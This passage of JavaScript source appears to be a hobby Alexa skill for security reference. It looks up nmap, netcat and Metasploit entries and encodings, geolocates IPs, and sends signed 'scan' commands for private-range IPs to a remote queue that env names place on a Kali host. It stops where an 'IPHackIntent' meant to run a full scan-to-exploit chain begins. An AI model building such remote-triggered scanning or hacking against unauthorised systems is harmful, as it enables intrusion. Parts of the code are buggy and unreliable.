            console.log('WebHeadersIntent>' + itemName);
            this.attributes.speechOutput = speechOutput;
            this.attributes.repromptSpeech = repromptSpeech;
               
            this.emit(':ask', speechOutput, repromptSpeech);
        }      
    }, 


    'HTTPVerbsIntent': function () {
        const itemSlot = this.event.request.intent.slots.HVItem;
        let itemName;
        if (itemSlot && itemSlot.value) {
            itemName = itemSlot.value.toLowerCase();
            itemName = itemName.replace('.', '');
        }      
               
        const cardTitle = this.t('HTTPVERBS_DISPLAY_CARD_TITLE', itemName);
        const myHTTPVerbs = this.t('HTTPVERBS');
        const httpverbs = myHTTPVerbs[itemName];
               
        if (httpverbs) {
            this.attributes.speechOutput = httpverbs;
            this.attributes.repromptSpeech = this.t('HTTPVERBS_REPEAT_MESSAGE');
            this.emit(':askWithCard', httpverbs, this.attributes.repromptSpeech, cardTitle, httpverbs);
        } else {
            let speechOutput = this.t('HTTPVERBS_NOT_FOUND_MESSAGE');
            const repromptSpeech = this.t('HTTPVERBS_NOT_FOUND_REPROMPT');
            if (itemName) {
                speechOutput += this.t('HTTPVERBS_NOT_FOUND_WITH_ITEM_NAME', itemName);
            } else {
                speechOutput += this.t('HTTPVERBS_NOT_FOUND_WITHOUT_ITEM_NAME');
            }  
            //speechOutput += repromptSpeech;
            console.log('HTTPVerbsIntent>' + itemName);
            this.attributes.speechOutput = speechOutput;
                    console.log('HTTPVerbsIntent');this.attributes.repromptSpeech = repromptSpeech;
               
            this.emit(':ask', speechOutput, repromptSpeech);
        }      
    }, 

    'NmapIntent': function () {
    	console.log("THIS.EVENT = " + JSON.stringify(this.event));
        const itemSlot = this.event.request.intent.slots.NMItem;
        let itemName;
        if (itemSlot && itemSlot.value) {
            itemName = itemSlot.value.toLowerCase();
            itemName = itemName.replace('.', '');
        }      
               
        const cardTitle = this.t('NMAP_DISPLAY_CARD_TITLE', itemName);
        const myNmap = this.t('NMAP');
        const nmap = myNmap[itemName];
               
        if (nmap) {
            this.attributes.speechOutput = nmap.speech;
            this.attributes.repromptSpeech = this.t('NMAP_REPEAT_MESSAGE');
            this.emit(':askWithCard', nmap.speech, this.attributes.repromptSpeech, cardTitle, nmap.card);
        } else {
            let speechOutput = this.t('NMAP_NOT_FOUND_MESSAGE');
            const repromptSpeech = this.t('NMAP_NOT_FOUND_REPROMPT');
            if (itemName) {
                speechOutput += this.t('NMAP_NOT_FOUND_WITH_ITEM_NAME', itemName);
            } else {
                speechOutput += this.t('NMAP_NOT_FOUND_WITHOUT_ITEM_NAME');
            }  
            //speechOutput += repromptSpeech;
            console.log('NmapIntent>' + itemName);
            this.attributes.speechOutput = speechOutput;
            this.attributes.repromptSpeech = repromptSpeech;
               
            this.emit(':ask', speechOutput, repromptSpeech);
        }      
    }, 

    'NetcatIntent': function () {
    	console.log("THIS.EVENT = " + JSON.stringify(this.event));
        const itemSlot = this.event.request.intent.slots.NCItem;
        let itemName;
        if (itemSlot && itemSlot.value) {
            itemName = itemSlot.value.toLowerCase();
            itemName = itemName.replace('.', '');
        }      
               
        const cardTitle = this.t('NETCAT_DISPLAY_CARD_TITLE', itemName);
        const myNetcat = this.t('NETCAT');
        const netcat = myNetcat[itemName];
               
        if (netcat) {
            this.attributes.speechOutput = netcat.speech;
            this.attributes.repromptSpeech = this.t('NETCAT_REPEAT_MESSAGE');
            this.emit(':askWithCard', netcat.speech, this.attributes.repromptSpeech, cardTitle, netcat.card);
        } else {
            let speechOutput = this.t('NETCAT_NOT_FOUND_MESSAGE');
            const repromptSpeech = this.t('NETCAT_NOT_FOUND_REPROMPT');
            if (itemName) {
                speechOutput += this.t('NETCAT_NOT_FOUND_WITH_ITEM_NAME', itemName);
            } else {
                speechOutput += this.t('NETCAT_NOT_FOUND_WITHOUT_ITEM_NAME');
            }  
            //speechOutput += repromptSpeech;
            console.log('NetcatIntent>' + itemName);
            this.attributes.speechOutput = speechOutput;
            this.attributes.repromptSpeech = repromptSpeech;
               
            this.emit(':ask', speechOutput, repromptSpeech);
        }      
    }, 

    'MetasploitIntent': function () {
    	console.log("THIS.EVENT = " + JSON.stringify(this.event));
        const itemSlot = this.event.request.intent.slots.MSFItem;
        let itemName;
        if (itemSlot && itemSlot.value) {
            itemName = itemSlot.value.toLowerCase();
        }      
               
        const cardTitle = this.t('METASPLOIT_DISPLAY_CARD_TITLE', itemName);
        const myMetasploit = this.t('METASPLOIT');
        const metasploit = myMetasploit[itemName];
               
        if (metasploit) {
            this.attributes.speechOutput = metasploit.speech;  // set the speech sub item type
            this.attributes.repromptSpeech = this.t('METASPLOIT_REPEAT_MESSAGE');
            this.emit(':askWithCard', metasploit.speech, this.attributes.repromptSpeech, cardTitle, metasploit.card);  // set the card output to the card item sub type
        } else {
            let speechOutput = this.t('METASPLOIT_NOT_FOUND_MESSAGE');
            const repromptSpeech = this.t('METASPLOIT_NOT_FOUND_REPROMPT');
            if (itemName) {
                speechOutput += this.t('METASPLOIT_NOT_FOUND_WITH_ITEM_NAME', itemName);
            } else {
                speechOutput += this.t('METASPLOIT_NOT_FOUND_WITHOUT_ITEM_NAME');
            }  
            //speechOutput += repromptSpeech;
            console.log('MetasploitIntent>' + itemName);
            this.attributes.speechOutput = speechOutput;
            this.attributes.repromptSpeech = repromptSpeech;
               
            this.emit(':ask', speechOutput, repromptSpeech);
        }      
    },

	// HTML encoding intent uses different output for speech and for card in order to preserve syntax for the card output
    'HTMLEncodingIntent': function () {
    try
    {
    	console.log("THIS.EVENT = " + JSON.stringify(this.event));
        const itemSlot = this.event.request.intent.slots.CHARItem;
        let itemName;
        if (itemSlot && itemSlot.value) {
            itemName = itemSlot.value.toLowerCase();
            itemName = itemName.replace('.', '');
        }      
               
        const cardTitle = this.t('HTMLENCODING_DISPLAY_CARD_TITLE', itemName);
        const myHTMLEncodings = this.t('HTMLENCODINGS');
        const encoding = myHTMLEncodings[itemName];
        //this.emit(':ask',itemName + " <> " + myHTMLEncodings[1]+ myHTMLEncodings[2]+ myHTMLEncodings[3]+ myHTMLEncodings[4]);       
        if (encoding) {
            this.attributes.speechOutput = itemName + " is represented by " + encoding.speech;  // sub item speech
            this.attributes.repromptSpeech = this.t('HTMLENCODING_REPEAT_MESSAGE');
            this.emit(':askWithCard', encoding.speech, this.attributes.repromptSpeech, cardTitle, encoding.card);  // sub item card
        } else {
            let speechOutput = this.t('HTMLENCODING_NOT_FOUND_MESSAGE');
            const repromptSpeech = this.t('HTMLENCODING_NOT_FOUND_REPROMPT');
            if (itemName) {
                speechOutput += this.t('HTMLENCODING_NOT_FOUND_WITH_ITEM_NAME', itemName);
            } else {
                speechOutput += this.t('HTMLENCODING_NOT_FOUND_WITHOUT_ITEM_NAME');
            }  
            //speechOutput += repromptSpeech;
            console.log('HTMLEncodingIntent>' + itemName);
            this.attributes.speechOutput = speechOutput;
            this.attributes.repromptSpeech = repromptSpeech;
               
            this.emit(':ask', speechOutput, repromptSpeech);
        }
    }
    catch (err) 
    {
        const repromptSpeech = this.t('HTMLENCODING_NOT_FOUND_REPROMPT');
        let errOutput = this.t('HTMLENCODING_NOT_FOUND_WITHOUT_ITEM_NAME');
        console.log('HTMLEncodingIntent Exception>');
        this.emit(':ask', errOutput, repromptSpeech);
    }
    },  

	//HEX encoding order to preserve syntax for the card output
    'HexEncodingIntent': function () {
    try
    {
    	console.log("THIS.EVENT = " + JSON.stringify(this.event));
        console.log('Made it to HexEncodingIntent');
        var itemSlot; 
        if (this.event.request.intent.slots.CHARItem)  itemSlot = this.event.request.intent.slots.CHARItem;
            else
                 {itemSlot=""; itemSlot.value = "null";}  // if the user doesn't say a character we must assume they want null (right?)
        
        console.log("itemSlot.value=" + itemSlot.value);
        
        let itemName = "dunno";  // default to null if the slot has a value that can't be matched
        if (itemSlot && itemSlot.value) {
            itemName = itemSlot.value.toLowerCase();
            itemName = itemName.replace('.', '');
        }      
        console.log("itemName=" + itemName);       
        const cardTitle = this.t('HEXENCODING_DISPLAY_CARD_TITLE', itemName);
        const myEncodings = this.t('CHARENCODINGS');
        const encoding =  myEncodings[itemName];
        console.log('encoding=' + encoding);

            var str = Number(encoding.card).toString(16);
		    if (str.length <=1)    str = "0" + str;
		    
		    encoding.speech = str  + " or 0 x " + str;
		    encoding.card = str + " or 0x" + str;

		console.log("encoding.speech=" + encoding.speech);
		console.log("encoding.card=" + encoding.card);
        if (encoding.speech && encoding.card) {
            this.attributes.speechOutput =  itemName + " is " + encoding.speech;  // sub item speech
            this.attributes.repromptSpeech = this.t('HEXENCODING_REPEAT_MESSAGE');
            this.emit(':askWithCard', encoding.speech, this.attributes.repromptSpeech, cardTitle, encoding.card); // encoding.card);  // sub item card
        } else {
            let speechOutput = this.t('HEXENCODING_NOT_FOUND_MESSAGE');
            const repromptSpeech = this.t('HEXENCODING_NOT_FOUND_REPROMPT');
            if (itemName && itemName !== "dunno") {
                speechOutput += this.t('HEXENCODING_NOT_FOUND_WITH_ITEM_NAME', itemName);
            } else {
                speechOutput += this.t('HEXENCODING_NOT_FOUND_WITHOUT_ITEM_NAME');
            }  
           // speechOutput += repromptSpeech;
            console.log('HexEncodingIntent>' + itemName);
            this.attributes.speechOutput = speechOutput;
            this.attributes.repromptSpeech = repromptSpeech;
               
            this.emit(':ask', speechOutput, repromptSpeech);
        } 
    }
    catch (err)
    {
        const repromptSpeech = this.t('HEXENCODING_NOT_FOUND_REPROMPT');
        let errOutput = this.t('HEXENCODING_NOT_FOUND_WITHOUT_ITEM_NAME');
        console.log('HexEncodingIntent Exception>');
        this.emit(':ask', errOutput, repromptSpeech);
    }
    },  
	
	//ASCII encoding rder to preserve syntax for the card output
    'ASCIIEncodingIntent': function () {
    try
    {
    	console.log("THIS.EVENT = " + JSON.stringify(this.event));
        const itemSlot = this.event.request.intent.slots.CHARItem;
        let itemName;
        if (itemSlot && itemSlot.value) {
            itemName = itemSlot.value.toLowerCase();
            itemName = itemName.replace('.', '');
        }      
               
        const cardTitle = this.t('ASCIIENCODING_DISPLAY_CARD_TITLE', itemName);
        const myEncodings = this.t('CHARENCODINGS');
        const encoding =  myEncodings[itemName];
          
        if (encoding) {
			encoding.speech = encoding.card;
            this.attributes.speechOutput = itemName + " is " + encoding.speech;  // sub item speech
            this.attributes.repromptSpeech = this.t('ASCIIENCODING_REPEAT_MESSAGE');
            this.emit(':askWithCard', encoding.speech , this.attributes.repromptSpeech, cardTitle, encoding.card);
        } else {
            let speechOutput = this.t('ASCIIENCODING_NOT_FOUND_MESSAGE');
            const repromptSpeech = this.t('ASCIIENCODING_NOT_FOUND_REPROMPT');
            if (itemName) {
                speechOutput += this.t('ASCIIENCODING_NOT_FOUND_WITH_ITEM_NAME', itemName);
            } else {
                speechOutput += this.t('ASCIIENCODING_NOT_FOUND_WITHOUT_ITEM_NAME');
            }  
            // speechOutput += repromptSpeech;
            console.log('ASCIIEncodingIntent>' + itemName);
            this.attributes.speechOutput = speechOutput;
            this.attributes.repromptSpeech = repromptSpeech;
               
            this.emit(':ask', speechOutput, repromptSpeech);
        } 
    }
    catch (err)
    {
        const repromptSpeech = this.t('ASCIIENCODING_NOT_FOUND_REPROMPT');
        let errOutput = this.t('ASCIIENCODING_NOT_FOUND_WITHOUT_ITEM_NAME');
        console.log('ASCIIEncodingIntent Exception>');
        this.emit(':ask', errOutput, repromptSpeech);
    }
    }, 	
	
	//URL encoding rder to preserve syntax for the card output
    'URLEncodingIntent': function () {
    try
    {
    	console.log("THIS.EVENT = " + JSON.stringify(this.event));
        const repromptSpeech = this.t('URLENCODING_NOT_FOUND_REPROMPT');
        
        if (!this.event.request.intent.slots.CHARItem){
            const cardTitle = this.t('URLENCODING_DISPLAY_CARD_TITLE', "(no input)");
            this.emit(':ask', "I guess you didn't tell me what character to look for.", this.attributes.repromptSpeech); 
            return;
        }
        const itemSlot = this.event.request.intent.slots.CHARItem;
        let itemName="";
        if (itemSlot )
        { 
            if (itemSlot.value) {
                itemName = itemSlot.value.toLowerCase();
                itemName = itemName.replace('.', '');
            }
        }      
               
        const cardTitle = this.t('URLENCODING_DISPLAY_CARD_TITLE', itemName);
        const myEncodings = this.t('CHARENCODINGS');
        const encoding =  myEncodings[itemName];
		var e = Number(encoding.card).toString(16);
		if (e.length <= 1) {e= "0" + e;}
		encoding.speech = "%" + e; 
		encoding.card = encoding.speech;
        if (encoding) {
            this.attributes.speechOutput = itemName + " is URL encoded as " + encoding.speech;  // sub item speech
            this.attributes.repromptSpeech = this.t('URLENCODING_REPEAT_MESSAGE');
            this.emit(':askWithCard', encoding.speech, this.attributes.repromptSpeech, cardTitle, encoding.card); 
            } else {
            let speechOutput = this.t('URLENCODING_NOT_FOUND_MESSAGE');
            
            if (itemName) {
                speechOutput += this.t('URLENCODING_NOT_FOUND_WITH_ITEM_NAME', itemName);
            } else {
                speechOutput += this.t('URLENCODING_NOT_FOUND_WITHOUT_ITEM_NAME');
            }  
            //speechOutput += repromptSpeech;
            console.log('URLEncodingIntent>' + itemName);
            this.attributes.speechOutput = speechOutput;
            this.attributes.repromptSpeech = repromptSpeech;
               
            this.emit(':ask', speechOutput, repromptSpeech);
        }
    }
    catch (err)
    {
        const repromptSpeech = this.t('URLENCODING_NOT_FOUND_REPROMPT');
        let errOutput = this.t('URLENCODING_NOT_FOUND_WITHOUT_ITEM_NAME');
        console.log('URLEncodingIntent Exception>');
        this.emit(':ask', errOutput, repromptSpeech);
    }
    }, 
	
	//HTTP response code 
    'HTTPResponseIntent': function () {
    	console.log("THIS.EVENT = " + JSON.stringify(this.event));
        const itemSlot = this.event.request.intent.slots.RCItem;
        let itemName;
        if (itemSlot && itemSlot.value) {
            itemName = itemSlot.value.toString();
            //itemName = itemName.replace('.', '');
            //console.log('HTTPResponseIntent>' + itemName);
        }      
               
        const cardTitle = this.t('RESPONSECODES_DISPLAY_CARD_TITLE', itemName);
        const myResponseCodes = this.t('RESPONSECODES');
        const responsecode =  myResponseCodes[itemName];
               
        if (responsecode) {
            this.attributes.speechOutput = responsecode; //responsecode.speech;  // sub item speech
            this.attributes.repromptSpeech = this.t('RESPONSECODES_REPEAT_MESSAGE');
            this.emit(':askWithCard', responsecode , this.attributes.repromptSpeech, cardTitle, responsecode);
        } else {
            let speechOutput = this.t('RESPONSECODES_NOT_FOUND_MESSAGE');
            const repromptSpeech = this.t('RESPONSECODES_NOT_FOUND_REPROMPT');
            if (itemName) {
                speechOutput += this.t('RESPONSECODES_NOT_FOUND_WITH_ITEM_NAME', itemName);
            } else {
                speechOutput += this.t('RESPONSECODES_NOT_FOUND_WITHOUT_ITEM_NAME');
            }  
            // speechOutput += repromptSpeech;
            console.log('HTTPResponseIntent>' + itemName);
            this.attributes.speechOutput = speechOutput;
            this.attributes.repromptSpeech = repromptSpeech;
               
            this.emit(':ask', speechOutput, repromptSpeech);
        }      
    }, 	
	
	//RickRollIntent 
    'RickRollIntent': function () {
        let rollthisguy = this.event.request.intent.slots.RRItem.value;
    
        const cardTitle = this.t('RICKROLL_DISPLAY_CARD_TITLE', rollthisguy);
        const responsecode = rollthisguy + ", this is for you! <audio src='https://" + process.env.RickRollPath + "'></audio> ";
        //const responsecode = "Never gonna <emphasis level='strong'>give youup, never gonna,let you <emphasis level='strong'>down, never gonna,run around and <emphasis level='strong'>desert,you" + rollthisguy; 
        if (responsecode) {
            this.attributes.speechOutput = responsecode; //responsecode.speech;  // sub item speech
            this.attributes.repromptSpeech = this.t('RICKROLL_REPEAT_MESSAGE');
            this.emit(':ask', responsecode, this.attributes.repromptSpeech);
            //this.emit(':tell', responsecode);
            //this.emit(':askWithCard', responsecode , this.attributes.repromptSpeech, cardTitle, this.t('RICKROLL_SONG') + rollthisguy);
        } else {
            let speechOutput = this.t('RICKROLL_NOT_FOUND_MESSAGE');
            const repromptSpeech = this.t('RICKROLL_NOT_FOUND_REPROMPT');
            if (rollthisguy) {
                speechOutput += this.t('RICKROLL_NOT_FOUND_WITH_ITEM_NAME', rollthisguy);
            } else {
                speechOutput += this.t('RICKROLL_NOT_FOUND_WITHOUT_ITEM_NAME');
            }  
            // speechOutput += repromptSpeech;
            console.log('RickRollIntent>' + rollthisguy);
            this.attributes.speechOutput = speechOutput;
            this.attributes.repromptSpeech = repromptSpeech;
               
            this.emit(':ask', speechOutput, repromptSpeech);
        }      
    }, 	

	//IPLookupIntent does IP location lookups on IP addresses provided by the user
   'IPLookupIntent': function (){
   	console.log("THIS.EVENT = " + JSON.stringify(this.event));
        //console.log("Made it to the IPLOOKUP intent");
        this.attributes['IPItemOne'] = this.event.request.intent.slots.IPItemOne.value; 
        this.attributes['IPItemTwo'] = this.event.request.intent.slots.IPItemTwo.value;
        this.attributes['IPItemThree'] = this.event.request.intent.slots.IPItemThree.value;
        this.attributes['IPItemFour'] = this.event.request.intent.slots.IPItemFour.value;
        
        if (this.event.request.intent.slots.IPItemOne.value 
        && this.event.request.intent.slots.IPItemTwo.value
        && this.event.request.intent.slots.IPItemThree.value
        && this.event.request.intent.slots.IPItemFour.value)
            {
                let ip1 =parseInt(this.event.request.intent.slots.IPItemOne.value,10); 
                let ip2 =parseInt(this.event.request.intent.slots.IPItemTwo.value,10);
                let ip3 =parseInt(this.event.request.intent.slots.IPItemThree.value,10);
                let ip4 =parseInt(this.event.request.intent.slots.IPItemFour.value,10);
                console.log(this.event.request.intent.slots.IPItemOne.value);
                console.log(this.event.request.intent.slots.IPItemTwo.value);
                console.log(this.event.request.intent.slots.IPItemThree.value);
                console.log(this.event.request.intent.slots.IPItemFour.value);
                if ( ip1 <256 && ip2 <256 && ip3 <256 && ip4 <256)
                {
                    if ((ip1 === 10)
                    || (ip1=== 192) && (ip2===168) 
                    || (ip1===172) && (ip2 >=16 && ip2 <=31)
                    || (ip1===127) && (ip2 ===0))
                    {
                        this.attributes.speechOutput = this.t("IPLOOKUP_LOCAL_IP");
                        this.attributes.repromptSpeech = this.t("IPLOOKUP_NOT_FOUND_REPROMPT");
                        this.emit(':ask', this.attributes.speechOutput, this.attributes.repromptSpeech);     
                    }
                    else  // the IP is probably valid
                    {
                        // the IP is mostly validated let's try it...
                        let itemSlot1 = this.event.request.intent.slots.IPItemOne.value;
                        let itemSlot2 = this.event.request.intent.slots.IPItemTwo.value;
                        let itemSlot3 = this.event.request.intent.slots.IPItemThree.value;
                        let itemSlot4 = this.event.request.intent.slots.IPItemFour.value;
                        let itemName =  itemSlot1 + '.' + itemSlot2 + '.' + itemSlot3 + '.' + itemSlot4;
                        var strIP = itemName;  
        
                        console.log("about to call getGeoLoc(ip)" + ' with ' + strIP);
                        var me = this;  // have to pass the context along to the callback funtion
                        getGeoLoc(strIP);
                    }
                }
              else  // part of the IP is greater than 256
              {
                console.log('IPLookupIntent bad slot value');
                let missedItem = "I missed an item.";
                if ( parseInt(this.event.request.intent.slots.IPItemOne.value,10) >255) missedItem = this.t("IP_LOOKUP_TOOBIG_ONE"); 
                if ( parseInt(this.event.request.intent.slots.IPItemTwo.value,10) >255) missedItem = this.t("IP_LOOKUP_TOOBIG_TWO");
                if ( parseInt(this.event.request.intent.slots.IPItemThree.value,10) >256) missedItem = this.t("IP_LOOKUP_TOOBIG_THREE");
                if ( parseInt(this.event.request.intent.slots.IPItemFour.value,10) >256) missedItem = this.t("IP_LOOKUP_TOOBIG_FOUR");
                
                this.attributes.speechOutput = this.t("IPLOOKUP_BAD_BIG_IP") + missedItem;
                this.attributes.repromptSpeech = this.t("IPLOOKUP_NOT_FOUND_REPROMPT");
               
                this.emit(':ask', this.attributes.speechOutput, this.attributes.repromptSpeech);
              }
            }
        else    // part of the IP is undefined which means we're missing one or more numbers.
        {
            console.log('IPLookupIntent bad slot value');
            let missedItem = "I missed an item.";
            if (!this.event.request.intent.slots.IPItemOne.value) missedItem = this.t("IP_LOOKUP_MISSING_ONE"); 
            if (!this.event.request.intent.slots.IPItemTwo.value) missedItem = this.t("IP_LOOKUP_MISSING_TWO");
            if (!this.event.request.intent.slots.IPItemThree.value) missedItem = this.t("IP_LOOKUP_MISSING_THREE");
            if (!this.event.request.intent.slots.IPItemFour.value) missedItem = this.t("IP_LOOKUP_MISSING_FOUR");
                
            this.attributes.speechOutput = this.t("IPLOOKUP_BAD_MISSING_IP") + missedItem;
            this.attributes.repromptSpeech = this.t("IPLOOKUP_NOT_FOUND_REPROMPT");
               
            this.emit(':ask', this.attributes.speechOutput, this.attributes.repromptSpeech);
        }
            
    //function getGeoLoc(ip, callback) 
    function getGeoLoc(ip)
    {
    	console.log("THIS.EVENT = " + JSON.stringify(this.event));
    //*    // ** add regex to check valid IP and throw away bad input
       var hoststr= 'http://freegeoip.net/json/' + ip;
        var http=require('http');
        console.log('about to do HTTP Get>' + ip);
        
        http.get(hoststr, function(res){
            var dat = '';
            console.log('<getGeoLocResp status code: >' + res.statusCode);
            res.on('data', function (chunk) {
                  dat += chunk;
                  // console.log('DATAchunk=' + dat);
             });
             res.on('error', function (e) {
                console.log('HTTP ERROR = ' + e);
                gotoDoneGeoLoc(ip, dat, res.statusCode);
            });
            res.on('end', function () {
               console.log('GeoLoc function DATA=' + dat);
               gotoDoneGeoLoc(ip, dat, res.statusCode);
               
            //return callback(dat);
            });
        });
    }
            
    function gotoDoneGeoLoc(ip,response,status)
    {    
    	//console.log("THIS.EVENT = " + JSON.stringify(this.event));
       // console.log('RES_PO_NSE_DATA:>> ' + response);
      // adding response building code inside the asynch function -- snip
        console.log("IP lookup returns>" + response);
        const cardTitle = me.t('IPLOOKUP_DISPLAY_CARD_TITLE', ip);
        console.log("status="+status);
        if (status ===200) 
        {
             var json = JSON.parse(response);
             var   responsedata ='IP address ' + json.ip + ' is located in ' + json.city + ' ' + json.region_name + ' ' + json.country_name; 
             const responsewords = responsedata; 

            if (json.city ==="" && json.country_name==="")
            {   // we got an empty response which probably means the IP is unassigned
                me.attributes.speechOutput = me.t('IPLOOKUP_EMPTY_RESPONSE'); 
                me.attributes.repromptSpeech = me.t('IPLOOKUP_REPEAT_MESSAGE');
                me.emit(':askWithCard', me.attributes.speechOutput , me.attributes.repromptSpeech, cardTitle, me.attributes.speechOutput);  
            }
            else
            {   // SUCCESS: we got a good response worth showing
                me.attributes.speechOutput = responsewords; 
                me.attributes.repromptSpeech = me.t('IPLOOKUP_REPEAT_MESSAGE');
                me.emit(':askWithCard', responsewords , me.attributes.repromptSpeech, cardTitle, responsedata);
            }
        } 
        else 
        {   // 404 or other error response code
            console.log("Lookup failed: ip=" + ip + " status code=" + status.ToString());
            let speechOutput = me.t('IPLOOKUP_NOT_FOUND_MESSAGE');
            const repromptSpeech = me.t('IPLOOKUP_NOT_FOUND_REPROMPT');
            if (ip) 
            {
                speechOutput += me.t('IPLOOKUP_NOT_FOUND_WITH_ITEM_NAME', ip);
            } else 
            {
                speechOutput += me.t('IPLOOKUP_NOT_FOUND_WITHOUT_ITEM_NAME');
            }  
            // speechOutput += repromptSpeech;
            console.log('IPLookupIntent>' + ip);
            me.attributes.speechOutput = speechOutput;
            me.attributes.repromptSpeech = repromptSpeech;
               
            me.emit(':ask', speechOutput, repromptSpeech);
        }
    }
},
    
	// This is different then IPHackIntent
   'IPScanIntent': function (){
   	console.log("THIS.EVENT = " + JSON.stringify(this.event));
        console.log("Made it to the IPScan or Hack intent");
        if (this.event.request.intent.slots.IPItemOne.value 
        && this.event.request.intent.slots.IPItemTwo.value
        && this.event.request.intent.slots.IPItemThree.value
        && this.event.request.intent.slots.IPItemFour.value)
            {
                console.log("about to parse ints");
                let ip1 =parseInt(this.event.request.intent.slots.IPItemOne.value,10); 
                let ip2 =parseInt(this.event.request.intent.slots.IPItemTwo.value,10);
                let ip3 =parseInt(this.event.request.intent.slots.IPItemThree.value,10);
                let ip4 =parseInt(this.event.request.intent.slots.IPItemFour.value,10);
                if ( ip1 <256 && ip2 <256 && ip3 <256 && ip4 <256)
                {
                    console.log("all IP portions are less than 256");
                    console.log("ip=" + ip1 + "." + ip2 + "." + ip3 + "." + ip4);
                    if ((ip1 === 10)
                    || ((ip1=== 192) && (ip2===168)) 
                    || ((ip1===172) && (ip2 >=16 && ip2 <=31))
                    || ((ip1===127) && (ip2 ===0)))
                    {
                        console.log("IP portions are local");
                        let itemSlot1 = this.event.request.intent.slots.IPItemOne.value;
                        let itemSlot2 = this.event.request.intent.slots.IPItemTwo.value;
                        let itemSlot3 = this.event.request.intent.slots.IPItemThree.value;
                        let itemSlot4 = this.event.request.intent.slots.IPItemFour.value;
                        let strIP =  itemSlot1 + '-' + itemSlot2 + '-' + itemSlot3 + '-' + itemSlot4;
                        console.log("about to ScanRequest with " + strIP);
                        var me = this; // pass context to the callback function
                        sendScanRequest(ip1,ip2,ip3,ip4);
    
                    }
                    else  // the IP is probably valid
                    {
                        console.log("The IP is valid but in the internet range");
                        // the IP is mostly validated let's try it...
                        //let itemSlot1 = this.event.request.intent.slots.IPItemOne.value;
                        //let itemSlot2 = this.event.request.intent.slots.IPItemTwo.value;
                       //let itemSlot3 = this.event.request.intent.slots.IPItemThree.value;
                       //let itemSlot4 = this.event.request.intent.slots.IPItemFour.value;
                        //let strIP =  itemSlot1 + '.' + itemSlot2 + '.' + itemSlot3 + '.' + itemSlot4;
                        this.attributes.speechOutput = this.t("IPSCAN_REMOTE_IP");
                        this.attributes.repromptSpeech = this.t("IPSCAN_NOT_FOUND_REPROMPT");
                        this.emit(':ask', this.attributes.speechOutput, this.attributes.repromptSpeech);         
                        //console.log("about to call getGeoLoc(ip)" + ' with ' + strIP);
                        //var me = this;  // have to pass the context along to the callback funtion
                       // sendScanRequest(strIP);
                    }
                }
              else  // part of the IP is greater than 256
              {
                console.log('IPScanIntent bad slot value');
                let missedItem = "I missed an item.";
                if ( parseInt(this.event.request.intent.slots.IPItemOne.value,10) >255) missedItem = this.t("IP_LOOKUP_TOOBIG_ONE"); 
                if ( parseInt(this.event.request.intent.slots.IPItemTwo.value,10) >255) missedItem = this.t("IP_LOOKUP_TOOBIG_TWO");
                if ( parseInt(this.event.request.intent.slots.IPItemThree.value,10) >256) missedItem = this.t("IP_LOOKUP_TOOBIG_THREE");
                if ( parseInt(this.event.request.intent.slots.IPItemFour.value,10) >256) missedItem = this.t("IP_LOOKUP_TOOBIG_FOUR");
                
                this.attributes.speechOutput = this.t("IPLOOKUP_BAD_BIG_IP") + missedItem;
                this.attributes.repromptSpeech = this.t("IPLOOKUP_NOT_FOUND_REPROMPT");
               
                this.emit(':ask', this.attributes.speechOutput, this.attributes.repromptSpeech);
              }
            }
        else    // part of the IP is undefined which means we're missing one or more numbers.
        {
            console.log('IPScanIntent bad slot value');
            let missedItem = "I missed an item.";
            if (!this.event.request.intent.slots.IPItemOne.value) missedItem = this.t("IP_LOOKUP_MISSING_ONE"); 
            if (!this.event.request.intent.slots.IPItemTwo.value) missedItem = this.t("IP_LOOKUP_MISSING_TWO");
            if (!this.event.request.intent.slots.IPItemThree.value) missedItem = this.t("IP_LOOKUP_MISSING_THREE");
            if (!this.event.request.intent.slots.IPItemFour.value) missedItem = this.t("IP_LOOKUP_MISSING_FOUR");
                
            this.attributes.speechOutput = this.t("IPLOOKUP_BAD_MISSING_IP") + missedItem;
            this.attributes.repromptSpeech = this.t("IPLOOKUP_NOT_FOUND_REPROMPT");
               
            this.emit(':ask', this.attributes.speechOutput, this.attributes.repromptSpeech);
        }
        
    function sendScanRequest(ip1,ip2,ip3,ip4)
    {
        console.log("About to do the crypto hash for scan request");
        //const https = require('https');
        var ipdash = ip1 + "-" + ip2 + "-" + ip3 + "-" + ip4; 
        var ip = ip1 + "." + ip2 + "." + ip3 + "." +ip4;
        var signature = crypto.createHash('md5').update(ipdash + process.env.SecretKey).digest("hex");
        var hoststr = "https://" + process.env.SecretURL +"/"+ process.env.AlexaToKaliQueuePage +"?cmd=scan," + ipdash + "&sig=" + signature;
        console.log ("SendScanRequest host=" + hoststr);
        console.log('About to do HTTPS Get> ' + hoststr);
     
     https.get(hoststr, (res) => {
        console.log('ScanIP statusCode:', res.statusCode);
        console.log('ScanIP headers:', res.headers);
        res.on('data', (d) => {
            console.log(d);
            //gotoDoneScanRequest(ip,res.statusCode); // something good happened we don't need to wait around
            });
            // should fire when request is done
             res.on('end', function () {
               gotoDoneScanRequest(ip,res.statusCode); });
            //
            }).on('error', (e) => {
                console.log(e);
            //    gotoDoneScanRequest(ip,600);  // something bad happened let's call it status 600
        });
        
      // gotoDoneScanRequest(ip,res.statusCode); // something good happened we don't need to wait around 
    }
            
    function gotoDoneScanRequest(ip,status)
    {    
        const cardTitle = me.t('IPSCAN_DISPLAY_CARD_TITLE', ip);
        console.log("DoneScanRequest status=" + status);
        if (status ===200) 
        {
             var   responsedata = me.t('IPSCAN_HACK_STARTED'); //"The hack is on the way."; 
                me.attributes.speechOutput = responsedata; 
                me.attributes.repromptSpeech = me.t('IPSCAN_REPEAT_MESSAGE');
                me.emit(':askWithCard', me.attributes.speechOutput , me.attributes.repromptSpeech, cardTitle, me.attributes.speechOutput);  
        } 
        else 
        {   // 404 or other error response code
            console.log("Lookup failed: ip=" + ip + " status code=" + status);
            let speechOutput = me.t('IPSCAN_NOT_FOUND_MESSAGE');
            const repromptSpeech = me.t('IPSCAN_NOT_FOUND_REPROMPT');
            if (ip) 
            {
                speechOutput += me.t('IPSCAN_NOT_FOUND_WITH_ITEM_NAME', ip);
            } else 
            {
                speechOutput += me.t('IPSCAN_NOT_FOUND_WITHOUT_ITEM_NAME');
            }  
            // speechOutput += repromptSpeech;
            console.log('IPLookupIntent>' + ip);
            me.attributes.speechOutput = speechOutput;
            me.attributes.repromptSpeech = repromptSpeech;
               
            me.emit(':ask', speechOutput, repromptSpeech);
        }
    }
},

// IPHackIntent actually do a full round-trip hack on the target from port scanning to exploiting -------------------
   'IPHackIntent': function (){
   	console.log("THIS.EVENT = " + JSON.stringify(this.event));
